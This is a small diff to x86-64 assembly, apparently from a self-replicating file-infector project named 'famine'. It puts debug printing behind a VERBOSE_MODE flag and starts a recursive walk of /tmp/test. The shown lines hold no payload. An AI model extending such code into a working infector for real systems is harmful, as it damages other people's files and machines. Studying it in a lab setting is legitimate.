@@ -119,9 +119,13 @@ _start:
     ; When running as original famine binary, use normal data sections
     mov qword [rel file_count], 0
     
+%ifdef VERBOSE_MODE
     lea rsi, [rel firstDir]     ; source = /tmp/test
     lea rdi, [rel path_buffer]
     call print_string
+%endif
+    lea rsi, [rel firstDir]     ; source = /tmp/test
+    lea rdi, [rel path_buffer]
     call str_copy
     lea rdi, [rel path_buffer]
     call list_files_recursive
